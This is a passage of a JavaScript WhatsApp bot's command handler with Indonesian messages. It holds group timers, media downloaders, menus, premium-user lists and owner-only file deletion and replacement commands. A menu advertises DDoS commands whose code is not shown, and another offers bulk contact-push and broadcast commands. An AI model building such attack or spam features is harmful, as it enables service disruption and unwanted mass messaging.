		case 'deletevote': case'delvote': case 'hapusvote': {
            if (!m.isGroup) return reply(`khusus group`)
            if (!text) return reply(`_*no voting in this group!*_\n\n*.vote* - to start voting`)
            delete vote[m.chat]
            reply('Successfully Deleted Vote Session In This Group')
	    }
            break

case 'closetime':
if (!m.isGroup) return 
if (!isBotAdmins) return 
if (args[1]=="detik") {var timer = args[0]*`1000`
} else if (args[1]=="menit") {var timer = args[0]*`60000`
} else if (args[1]=="jam") {var timer = args[0]*`3600000`
} else if (args[1]=="hari") {var timer = args[0]*`86400000`
} else {return m.reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
m.reply(`Close time ${q} dimulai dari sekarang`)
setTimeout( () => {
const close = `*Tepat waktu* grup ditutup oleh admin\nsekarang hanya admin yang dapat mengirim pesan`
ptz.groupSettingUpdate(m.chat, 'announcement')
m.reply(close)
}, timer)
break

case "close":
if (!m.isGroup) return 
if (!isBotAdmins) return 
ptz.groupSettingUpdate(m.chat, 'announcement')
break

case "close":
if (!m.isGroup) return 
if (!isBotAdmins) return 
ptz.groupSettingUpdate(m.chat, 'not_announcement')
break
  
case 'opentime':
if (!m.isGroup) return 
if (!isBotAdmins) return 
if (args[1]=="detik") {var timer = args[0]*`1000`
} else if (args[1]=="menit") {var timer = args[0]*`60000`
} else if (args[1]=="jam") {var timer = args[0]*`3600000`
} else if (args[1]=="hari") {var timer = args[0]*`86400000`
} else {return m.reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
m.reply(`Open time ${q} dimulai dari sekarang`)
setTimeout( () => {
const open = `*Tepat waktu* grup dibuka oleh admin\n sekarang member dapat mengirim pesan`
ptz.groupSettingUpdate(m.chat, 'not_announcement')
m.reply(open)
}, timer)
break

        case "setwelcome": 
        if (!text) throw "Masukan Deskripsi nya"
        chatdb.setwelcome = text
        m.reply("Succes")
        break
        
        case "welcome": 
        if (!text) return m.reply("On / Off, Ex: .welcome on")
        if (text === "on") {
        if (global.welcome === true) return m.reply ("*_status: true_*")
        global.welcome = true
        m.reply ("*_Succes Change, status: true_*")
        } else if (text === "off") {
        if (global.welcome === false) return m.reply ("*_status: false_*")
        global.welcome = false
        m.reply ("*_Succes Change, status: false_*")
        }
        
        break
        
        
       case "mainmon": case "mainmenu":
        reply(`╭┈──────────────────
│ *${m2}${khasatas1} M A I N - M E N U ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ᴅɪꜱᴋ
│  ${khasmiring}  .ᴘɪɴɢ
│  ${khasmiring}  .ʀᴜɴᴛɪᴍᴇ
│  ${khasmiring}  .ᴋᴏᴅᴇʙᴀʜᴀꜱᴀ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎ ‎‎ ‎ ‎${footer} ‎  ‎‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
        break
        
case 'igimage':        
case 'igimg': {
   if (!text) return m.reply(`Anda perlu memberikan URL foto, postingan, gambar Instagram`);

  let cbbbbbbbbb = await fg.igdl(text)
ptz.sendMessage(m.chat, {
image: {url: cbbbbbbbbb.result[0].url},
caption: "Done",
}, {quoted:m})

}
break
        
case 'instagram':
case 'ig':
case 'igvideo':
case 'igvid': {
    if (!text) return m.reply(`Anda perlu memberikan URL video, reel`);

    let cbbbbbbbbb = await fg.igdl(text)
ptz.sendMessage(m.chat, {
video: {url: cbbbbbbbbb.result[0].url},
caption: "Done",
}, {quoted:m})
}
break

case 'spotify': {
if (!text) return m.reply(`Contoh : ${prefix + command} snowfall`);
let api = await fetchJson(`https://api.junn4.my.id/search/spotify?query=${text}`);
const hasil = `*S P O T I F Y - D L*

•° *Title*: ${api.data[0].title}
 • *Duration*: ${api.data[0].duration}
 • *Popular*: ${api.data[0].popularity}
•° *Url*: ${api.data[0].url}
`

ptz.sendMessage(m.chat, {text:hasil})
const spodl = await (await fetchJson(`https://api.junn4.my.id/download/spotify?url=${api.data[0].url}`))
const spoDl = spodl.data.download



ptz.sendMessage(m.chat, {
audio: {
url: spoDl
},
mimetype: 'audio/mpeg',
ptt: true,
contextInfo: {
externalAdReply: {
title: `   - sᴘᴏᴛɪғʏ -`,
body: "",
thumbnailUrl: spodl.data.image,
sourceUrl: global.sourceurl,
mediaType: 2,
showAdAttribution: true,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
}
break   

  case 'gdrive': {
		if (!args[0]) return m.reply(`Enter the Google Drive link`)
	try {
	let res = await fg.GDriveDl(args[0])
	 m.reply(`*GDrive DL*

•° *Nama:* ${res.fileName}
 • *Size:* ${res.fileSize}
•° *Type:* ${res.mimetype}`)
    setTimeout(() => {
	ptz.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, {})
	}, 1000)
   } catch {
	reply('Error: Check link or try another link') 
  }
}
break

       case 'mediafire': case 'mf': {
  	if (!args[0]) return reply(`Enter the mediafire link next to the command`)
    if (!args[0].match(/mediafire/gi)) return reply(`Link incorrect`)
    const { mediafiredl } = require('@bochilteam/scraper')
    let full = /f$/i.test(command)
    let u = /https?:\/\//.test(args[0]) ? args[0] : 'https://' + args[0]
    let res = await mediafiredl(args[0])
    let { url, url2, filename, ext, aploud, filesize, filesizeH } = res
    let caption = `*MEDIAFIRE DL*

•° *Number:* ${filename}
 • *Size:* ${filesizeH}
 • *Extension:* ${ext}
•° *Uploaded:* ${aploud}
`.trim()
    ptz.sendMessage(m.chat, { document : { url : url}, fileName : filename, mimetype: ext }, { quoted : m })
    }
    break
        
        
        case "toolsmon": case "toolsmenu":
        reply(`╭┈──────────────────
│ *${m2}${khasatas1} T O O L S - M E N U ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ᴛᴛꜱ
│  ${khasmiring}  .ʀᴇᴀᴅᴠᴏ
│  ${khasmiring}  .ᴡᴀʟʟᴘᴀᴘᴇʀ
│  ${khasmiring}  .ꜰʟᴀᴍɪɴɢ1
│  ${khasmiring}  .ꜰʟᴀᴍɪɴɢ2
│  ${khasmiring}  .ꜰʟᴀᴍɪɴɢ3
│  ${khasmiring}  .ꜰʟᴀᴍɪɴɢ4
│  ${khasmiring}  .ꜰʟᴀᴍɪɴɢ5
│  ${khasmiring}  .ꜰʟᴀᴍɪɴɢ6
│  ${khasmiring}  .ᴋᴏᴅᴇʙᴀʜᴀꜱᴀ
│  ${khasmiring}  .ʀᴇᴍᴏᴠᴇʙɢ
│  ${khasmiring}  .ᴛʀ
│  ${khasmiring}  .ᴊᴀʀᴀᴋ
│  ${khasmiring}  .ᴏᴄʀ
│  ${khasmiring}  .ᴋᴀʟᴋᴜʟᴀᴛᴏʀ
│  ${khasmiring}  .ɢᴇᴛ
│  ${khasmiring}  .ʏᴛᴍᴘ3
│  ${khasmiring}  .ʏᴛᴍᴘ4
│  ${khasmiring}  .ᴛɪᴋᴛᴏᴋ
│  ${khasmiring}  .ɪɢ
│  ${khasmiring}  .ꜱᴘᴏᴛɪꜰʏ
│  ${khasmiring}  .ᴍᴇᴅɪᴀꜰɪʀᴇ
│  ${khasmiring}  .ɢᴅʀɪᴠᴇ
│  ${khasmiring}  .ɢɪᴛᴄʟᴏɴᴇ
│  ${khasmiring}  .ᴛᴡɪᴛᴛᴇʀ 
│  ${khasmiring}  .ꜰʙ
│  ${khasmiring}  .ᴏʙꜰᴜꜱ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎ ‎‎ ‎ ‎${footer} ‎  ‎‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
        break
        case "wallpaper":
        const hhjw = await (await fetch(`https://widipe.com/wallpaper?query=${text}`)).json()
        ptz.sendImage(m.sender, hhjw, m)
        break
      case "stickermon": case "stickermenu": case "stikermenu":
        reply(`╭┈──────────────────
│ *${m2}${khasatas1} S T I C K - M E N U ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ꜱᴛɪᴄᴋᴇʀ
│  ${khasmiring}  .ᴄʟꜱ
│  ${khasmiring}  .ꜱᴍᴇᴍᴇ 
│  ${khasmiring}  .Qᴄ
│  ${khasmiring}  .ꜱᴍᴇᴛᴀ
│  ${khasmiring}  .ꜱᴛɪᴄᴋʜᴀɴᴅʜᴏʟᴅ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋꜱʜɪɴᴏʙᴜ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋᴄᴜᴅᴅʟᴇ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋʜɪɢʜꜰɪᴠᴇ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋᴅᴀɴᴄᴇ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋᴄʀɪɴɢᴇ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋʜᴀᴘᴘʏ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋɢʟᴏᴍᴘ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋꜱᴍᴜɢ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋʙʟᴜꜱʜ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋᴀᴡᴏᴏ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋᴡᴀᴠᴇ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋꜱᴍɪʟᴇ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋꜱʟᴀᴘ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋᴘᴏᴋᴇ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋᴡɪɴᴋ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋʙᴏɴᴋ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋʙᴜʟʟʏ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋʏᴇᴇᴛ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋʙɪᴋᴇ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋᴋɪꜱꜱ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋʟɪᴄᴋ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋᴘᴀᴛ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋʜᴜɢ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋᴋɪʟʟ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋᴄʀʏ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋꜱᴘᴀɴᴋ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋᴛɪᴄᴋʟᴇ 
│  ${khasmiring}  .ᴋɪʟʟ
│  ${khasmiring}  .ʜᴀɴᴅʜᴏʟᴅ
│  ${khasmiring}  .ʜɪɢʜꜰɪᴠᴇ
│  ${khasmiring}  .ᴄʀɪɴɢᴇ
│  ${khasmiring}  .ᴅᴀɴᴄᴇ
│  ${khasmiring}  .ʜᴀᴘᴘʏ
│  ${khasmiring}  .ꜱᴍᴜɢ
│  ${khasmiring}  .ɢʟᴏᴍᴘ
│  ${khasmiring}  .ᴡᴀᴠᴇ
│  ${khasmiring}  .ʙʟᴜꜱʜ 
│  ${khasmiring}  .ꜱʟᴀᴘ
│  ${khasmiring}  .ꜱᴍɪʟᴇ
│  ${khasmiring}  .ᴘᴏᴋᴇ
│  ${khasmiring}  .ɴᴏᴍ
│  ${khasmiring}  .ᴡɪɴᴋ
│  ${khasmiring}  .ʏᴇᴇᴛ
│  ${khasmiring}  .ʙɪᴛᴇ
│  ${khasmiring}  .ʙᴏɴᴋ
│  ${khasmiring}  .ʟɪᴄᴋ
│  ${khasmiring}  .ᴘᴀᴛ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎ ‎‎ ‎ ‎${footer} ‎  ‎‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
        break
        case "ddosmenu": case "ddosmon":
        reply(`╭┈──────────────────
│ *${m2}${khasatas1} D D O S - M E N U ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ᴅᴏᴡɴ1
│  ${khasmiring}  .ᴅᴏᴡɴ2
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎ ‎‎ ‎ ‎${footer} ‎  ‎‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
        break
        case "tempormon": case "tempormenu":
        reply(`╭┈──────────────────
│ *${m2}${khasatas1} T E M P - M E N U ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ᴛᴇᴍᴘ-ꜱᴛᴀʀᴛ 
│  ${khasmiring}  .ᴛᴇᴍᴘ-ꜱᴛᴏᴘ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎ ‎‎ ‎ ‎${footer} ‎  ‎‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
        break
        
        case "jadibotmon": case "jadibotmenu":
        reply(`╭┈──────────────────
│ *${m2}${khasatas1} J D B O T - M E N U ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ᴊᴀᴅɪʙᴏᴛ-ᴘᴀɪʀɪɴɢ
│  ${khasmiring}  .ᴊᴀᴅɪʙᴏᴛ-ꜱᴄᴀɴ
│  ${khasmiring}  .ꜱᴛᴀʀᴛ-ᴊᴀᴅɪʙᴏᴛ 
│  ${khasmiring}  .ꜱᴛᴏᴘ-ᴊᴀᴅɪʙᴏᴛ
│  ${khasmiring}  .ʟɪꜱᴛ-ᴊᴀᴅɪʙᴏᴛ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎ ‎‎ ‎ ‎${footer} ‎  ‎‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
        break
    case "ownermon": case "ownermenu":
        reply(`╭┈──────────────────
│ *${m2}${khasatas1} O W N - M E N U ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ᴘᴜʙʟɪᴄ
│  ${khasmiring}  .ꜱᴇʟꜰ
│  ${khasmiring}   $ 
│  ${khasmiring}   =>
│  ${khasmiring}   > 
│  ${khasmiring}  .ᴀᴅᴅᴄᴀꜱᴇ
│  ${khasmiring}  .ᴅᴇʟᴄᴀꜱᴇ
│  ${khasmiring}  .ʟɪꜱᴛᴄᴀꜱᴇ
│  ${khasmiring}  .ʀᴇꜱᴛᴀʀᴛ
│  ${khasmiring}  .ꜱᴛᴏᴘ
│  ${khasmiring}  .ʟɪꜱᴛᴄᴀꜱᴇ
│  ${khasmiring}  .ɢᴇᴛꜱᴇꜱꜱɪᴏɴ
│  ${khasmiring}  .ᴅᴇʟꜱᴇꜱꜱɪᴏɴ 
│  ${khasmiring}  .ɢᴇᴛᴄᴀꜱᴇ
│  ${khasmiring}  .ꜱᴇᴛʀᴇᴘʟʏ
│  ${khasmiring}  .ꜱᴇᴛᴍᴇɴᴜ
│  ${khasmiring}  .ɢᴇᴛꜰᴜɴᴄ
│  ${khasmiring}  .ᴅᴇʟꜰɪʟᴇ
│  ${khasmiring}  .ᴅᴇʟꜰᴏʟᴅᴇʀ
│  ${khasmiring}  .ᴀᴅᴅꜱᴄʀᴀᴘᴇ
│  ${khasmiring}  .ᴍᴜᴛᴇɢᴄ
│  ${khasmiring}  .ʙʟᴏᴄᴋ
│  ${khasmiring}  .ᴜɴʙʟᴏᴄᴋ
│  ${khasmiring}  .ꜱᴇᴛᴘᴘʙᴏᴛ
│  ${khasmiring}  .ᴅᴇʟᴘᴘʙᴏᴛ
│  ${khasmiring}  .ꜱᴇᴛʙɪᴏʙᴏᴛ
│  ${khasmiring}  .ᴊᴏɪɴ
│  ${khasmiring}  .ᴀᴅᴅᴏᴡɴᴇʀ
│  ${khasmiring}  .ᴅᴇʟᴏᴡɴᴇʀ
│  ${khasmiring}  .ᴀᴅᴅᴘʀᴇᴍ
│  ${khasmiring}  .ᴅᴇʟᴘʀᴇᴍ
│  ${khasmiring}  .ʟɪꜱᴛᴘʀᴇᴍ
│  ${khasmiring}  .ʀᴇᴀᴅᴄʜᴀɴɢᴇ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎ ‎‎ ‎ ‎${footer} ‎  ‎‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
        break
    //=================================================//
    case 'readchange': case 'autoread':{
if (!isCreator) return 
if (args.length < 1) return reply(`Contoh ${prefix + command} on/off`)
if (q === 'on') {
global.autoread = true
m.reply(`Berhasil mengubah autoread ke ${q}`)
} else if (q === 'off') {
global.autoread = false
m.reply(`Berhasil mengubah autoread ke ${q}`)
}
}
break

    case "setmenu":
    if (!isCreator) return 
    if (text === "v1") {
    m.reply("Succes")
    global.setmenu = "v1"
    } else if (text === "v2") {
    m.reply("Succes")
    global.setmenu = "v2"
    } else if (text === "v3") {
    m.reply("Succes")
    global.setmenu = "v3"
    } else {
    m.reply("Ex: .setmenu v1 / v2 / v3")
    }
    break
    
    case "setreply":
    if (!isCreator) return 
    if (text === "v1") {
    m.reply("Succes")
    global.setreply = "v1"
    } else if (text === "v2") {
    m.reply("Succes")
    global.setreply = "v2"
    } else if (text === "v3") {
    m.reply("Succes")
    global.setreply = "v3"
    } else if (text === "v4") {
    m.reply("Succes")
    global.setreply = "v4"
    } else if (text === "v5") {
    global.setreply = "v5"
    } else {
    m.reply("Ex: .setreply v1 / v2 / v3 / v4 / v5")
    }
    break
case 'block':
if (!isCreator) return m.reply("Kamu Bukan Owner");
if(isGroup){
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if(users){
await ptz.updateBlockStatus(users, "block")
m.reply(`Sukses block user`)
} else {
m.reply("Silakan reply pesan atau tag atau input nomer yang mau di block")
}
} else if(!isGroup){
if(q){
var woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
if(woke.startsWith("08")) return m.reply("Awali nomer dengan 62")
if(!woke.startsWith("62")) return m.reply("Silakan reply pesan atau tag atau input nomer yang mau di block")
await ptz.updateBlockStatus(woke, "block")
} else if(!q){
m.reply("Masukan nomer yang ingin di block")
}
m.reply(`Berhasil Block user ${woke.split("@")[0]}`)
}
break
case 'unblock':
if (!isCreator) return m.reply("Kamu Bukan Owner");
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if(isGroup){
if(users){
await ptz.updateBlockStatus(users, "unblock")
await m.reply(`Sukses unblock user`)
} else if(!q){
m.reply("Silakan reply pesan atau tag atau input nomer yang mau di block")
}
} else if(!isGroup){
if(q){
let woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
if(woke.startsWith("08")) return m.reply("Awali nomer dengan 62")
if(!woke.startsWith("62")) return m.reply("Silakan reply pesan atau tag atau input nomer yang mau di block")
await ptz.updateBlockStatus(woke, "unblock")
m.reply(`Sukses unblock ${woke}`)
} else if(!q){
m.reply("Masukan nomer yang ingin di unblock")
}

}
break
case 'setppbot':{
if (!isCreator) return m.reply("Kamu Bukan Owner");
if(m.quoted){
const media = await ptz.downloadAndSaveMediaMessage(quoted)
const { img } = await generateProfilePicture(media)
await ptz.query({ tag: 'iq',  attrs: { to: botNumber, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})   
await m.reply(`Done`)
} else m.reply("Reply fotonya")
}
break
case 'delppbot': {
if (!isCreator) return m.reply("Kamu Bukan Owner");
ptz.removeProfilePicture(ptz.user.id)
m.reply("Done")
}
break
case 'setbiobot':{
if (!isCreator) return m.reply("Kamu Bukan Owner");
if (!q) return m.reply(`Kirim perintah ${prefix+command} nama\n\nContoh : ${command} Paijo`)
await ptz.updateProfileStatus(q)
await m.reply(`Berhasil mengganti status bio ke *${q}*`)
}
break
case 'join': {
if (!isCreator) return m.reply("Kamu Bukan Owner")
if (!text) return m.reply('Masukkan Link Group!')
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return 'Link Invalid!'
m.reply(mess.wait)
let result = args[0].split('https://chat.whatsapp.com/')[1]
await ptz.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break        
        //======//
        case "public":
         if (!isCreator) return 
        ptz.public = true 
        m.reply("Done")
        break
        
        case "self":
        if (!isCreator) return 
        ptz.public = false
        m.reply("Done")
        break
        
        case 'getcase':
 if (!isCreator) return 
if (!q) return reply(`Contoh penggunaan: ${prefix+command} menu`)
const getcase = (cases) => {
return "case "+`'${cases}'`+fs.readFileSync('./message.js').toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
}
reply(`${getcase(q)}`)
break
case 'getfunc':
if (!isCreator) return 
if (!q) return reply(`Contoh penggunaan: ${prefix+command} const reply`)
const getfunc = (funcc) => {
return `'${funcc}'`+fs.readFileSync('./message.js').toString().split(`+funcc+`)[1].split('')
}
reply(`${getfunc(q)}`)
break

case "delfile":
if (!isCreator) return 
if (!text) return m.reply("Ex: .delfile ./database/prem.json")
fs.unlinkSync(text)
m.reply ("Done")
break

case 'delfolder':
if (!isCreator) return 
if (!text) return reply(`*Ex* : ${prefix + command} ./session2`)
rimraf.sync(`${text}`)
reply(`Berhasil hapus folder ${q}`)
break

 case 'gfl': case "gantifile":{
if (!isCreator) return 
if (!text.includes("./")) return m.reply(`*Example* : ${prefix + command} ./package.json`)
let files = fs.readdirSync(text.split(m.quoted.fileName)[0])
if (!files.includes(m.quoted.fileName)) return reply("File not found") 
let media = await downloadContentFromMessage(m.quoted, "document")
let buffer = Buffer.from([])
for await(const chunk of media) {
buffer = Buffer.concat([buffer, chunk])
}
fs.writeFileSync(text, buffer)
m.reply(`Mengupload`)
await sleep(2000)
reply(`Berhasil mengganti file ${q}`)
}
break
        //=====//
 case "rpgmon": case "rpgmenu":
 reply (`
╭┈──────────────────
│ *${m2}${khasatas1} R P G - M E N U ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ꜱᴘɪɴ
│  ${khasmiring}  .ʙᴇʀʙᴜʀᴜ
│  ${khasmiring}  .ᴍɪɴɪɴɢ
│  ${khasmiring}  .ɢʟᴏʙᴀʟ
│  ${khasmiring}  .ᴜꜱᴇ-ᴘᴏᴡᴇʀ
│  ${khasmiring}  .ꜱᴇʟʟ
│  ${khasmiring}  .ɪɴᴠᴇɴᴛᴏʀʏ
│  ${khasmiring}  .ʙᴜʏ
│  ${khasmiring}  .ᴘʀᴏꜰɪʟᴇ
│  ${khasmiring}  .ᴊᴏɪɴʀᴘɢ
│  ${khasmiring}  .ᴇxɪᴛʀᴘɢ
│  ${khasmiring}  .ᴄʀᴇᴀᴛᴇɢᴜɪʟᴅ
│  ${khasmiring}  .ʟɪꜱᴛɢᴜɪʟᴅ
│  ${khasmiring}  .ᴊᴏɪɴɢᴜɪʟᴅ
│  ${khasmiring}  .ᴅᴇʟɢᴜɪʟᴅ
│  ${khasmiring}  .ɢᴜɪʟᴅɪɴꜰᴏ
│  ${khasmiring}  .ᴍʏɢᴜɪʟᴅ
│  ${khasmiring}  .ʙᴀᴛᴛʟᴇ *<628xxx>*
│  ${khasmiring}  .ᴀᴄᴄ-ʙᴀᴛᴛʟᴇ
│  ${khasmiring}  .ʀᴇᴊᴇᴄ-ʙᴀᴛᴛʟᴇ
│  ${khasmiring}  .ʟᴜᴄᴋʏᴅᴀʏ
│  ${khasmiring}  .ᴅᴀɪʟʏ
│  ${khasmiring}  .ᴡᴇᴇᴋʟʏ
│  ${khasmiring}  .ʏᴇᴀʀʟʏ
│  ${khasmiring}  .ᴍᴀɴᴄɪɴɢ
│  ${khasmiring}  .ꜱᴇᴛɴᴀᴍᴇ
│  ${khasmiring}  .ɢɪᴠᴇ-ꜰᴏᴏᴅ
│  ${khasmiring}  .ʀᴇᴄᴏᴠᴇʀ
│  ${khasmiring}  .ꜱʟᴇᴇᴘ
│  ${khasmiring}  .ʙᴇʀᴍᴀɪɴ
│  ${khasmiring}  .ʟᴀᴛɪʜ-ᴅɪɢɪᴍᴏɴ
│  ${khasmiring}  .ᴍʏᴅɪɢɪ
│  ${khasmiring}  .ᴄʜᴇᴀᴛ
│  ${khasmiring}  .ᴄᴀʀɪ-ʀᴘɢ
│  ${khasmiring}  .ᴍᴜꜱᴜʜ
│  ${khasmiring}  .ᴍᴜʟᴜɴɢ
│  ${khasmiring}  .ʜᴀᴜʟɪɴɢ
│  ${khasmiring}  .ᴋᴜʀɪʀ
│  ${khasmiring}  .ɢᴇᴛᴅɪɢɪ
│  ${khasmiring}  .ʟᴀᴍᴀʀ-ᴋᴇʀᴊᴀ
│  ${khasmiring}  .ᴏᴜᴛ-ᴋᴇʀᴊᴀ
│  ${khasmiring}  .ᴘᴏʟɪꜱɪ
│  ${khasmiring}  .ᴏᴊᴇᴋ
│  ${khasmiring}  .ᴅᴏᴋᴛᴇʀ
│  ${khasmiring}  .ᴘᴇᴛᴀɴɪ
│  ${khasmiring}  .ᴘᴇɴᴅᴀɢᴀɴɢ
│  ${khasmiring}  .ʟɪꜱᴛ-ꜱᴋɪʟ
│  ${khasmiring}  .ᴅ-ᴛᴇʀᴍɪɴᴀʟ
│  ${khasmiring}  .ᴅ3
│  ${khasmiring}  .ʀᴜʟᴇꜱ-ʀᴘɢ
│  ${khasmiring}  .ɢᴜɪᴅᴇ-ʀᴘɢ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎ ‎‎ ‎ ‎${footer} ‎  ‎‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
 break
    case 'owner': case 'crator':{
ptz.sendMessage(m.chat, { 
contacts: { 
displayName: `${list.length} Kontak`, 
contacts: list }, contextInfo: {
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid: [m.sender],
forwardedNewsletterMessageInfo: {
            newsletterJid: global.idsaluran,
            serverMessageId: null,
            newsletterName: global.namesaluran
        },
}}, { quoted: m })
}
        break    
        
        case 'addprem':{
if (!isCreator) return reply(`Hanya Untuk Owner`)
if (!args[0]) return reply(`Penggunaan ${prefix+command} Penggunaan : *.addprem* 628xxx`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await ptz.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync("./database/premium.json", JSON.stringify(prem))
reply(`Nomor ${prrkek} Telah Menjadi Premium!`)
}
break
case "delprem":{
if (!isCreator) return reply(`Hanya Untuk Owner`)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync("./database/premium.json", JSON.stringify(prem))
reply(`Nomor ${ya} Telah Di Hapus Premium!`)
}
break
        

case 'listpremium':
case 'listprem': {
    try {
        let teks = '*`[ L I S T - P R E M I U M ]`*\n\n';
        for (let i of prem) {
            teks += `- ${i}\n`;
        }
        teks += `\n*Total : ${prem.length}*`;
        ptz.sendMessage(m.chat, { text: teks }, { quoted: m });
    } catch (e) {
        m.reply(e);
    }
} 
break;
            
 case 'textimg': case 'txt2img':
if (!text) return reply(`Example: .${command} rain on road`)
let ancu = await fetch(`https://widipe.com/ai/text2img?text=${text}`)
await ptz.sendMessage(m.chat, {image: {url:ancu}, caption: `masih error ${text}`},{quoted:fsaluran})
break      
        case "pushkontakmenu": case "pushkontak": case "pushkontakmon":
        let cg = `
╭┈──────────────────
│ *${m2}${khasatas1} P U S H - M E N U ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ᴄᴇᴋɪᴅɢᴄ
│  ${khasmiring}  .ʟɪꜱᴛɢʀᴏᴜᴘ
│  ${khasmiring}  .ᴘᴜꜱʜᴋᴏɴᴛᴀᴋᴠ1
│  ${khasmiring}  .ᴘᴜꜱʜᴋᴏɴᴛᴀᴋᴠ2
│  ${khasmiring}  .ᴘᴜꜱʜᴋᴏɴᴛᴀᴋᴠ3
│  ${khasmiring}  .ᴘᴜꜱʜᴋᴏɴᴛᴀᴋᴠ4
│  ${khasmiring}  .ꜱᴀᴠᴇᴄᴏɴᴛᴀᴄᴛᴠ1
│  ${khasmiring}  .ꜱᴀᴠᴇᴄᴏɴᴛᴀᴄᴛᴠ2
│  ${khasmiring}  .ɢᴇᴛᴄᴏɴᴛᴀᴄᴛ
│  ${khasmiring}  .ꜱᴇɴᴅᴋᴏɴᴛᴀᴋ
│  ${khasmiring}  .ᴊᴘᴍ
│  ${khasmiring}  .ʙᴄɢᴄ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎ ‎‎ ‎ ‎${footer} ‎  ‎‎‎</>${m2}  
  ⟢• ──────────────── •⟢`
        reply (cg)
        break
        case "ramlist": case "listram":
        let ckckk = `*${m2}[ LIST RAM TERSEDIA ]${m2}*
 ‎‎⟢• ─────────── •⟢
│ 1gb     ••      ☑️
│ 2gb     ••      ☑️
│ 3gb     ••      ☑️
│ 4gb     ••      ☑️
│ 5gb     ••      ☑️
│ 6gb     ••      ☑️
│ 7gb     ••      ☑️
│ 8gb     ••      ☑️
│ unli     ••      ☑️
 ‎‎⟢• ─────────── •⟢`
reply (ckckk)
break
        case "tagall":
if (!isAdmins) return
let teks0 = `〘      *Tag All*     〙
 •• *Pesan : ${q ? q : 'kosong'}* ••\n\n`
for (let mem of participants) {
teks0 += `☌  @${mem.id.split("@")[0]}\n`
}
ptz.sendMessage(m.chat, { text: teks0, mentions: participants.map(a => a.id) }, { quoted: fsaluran})
break
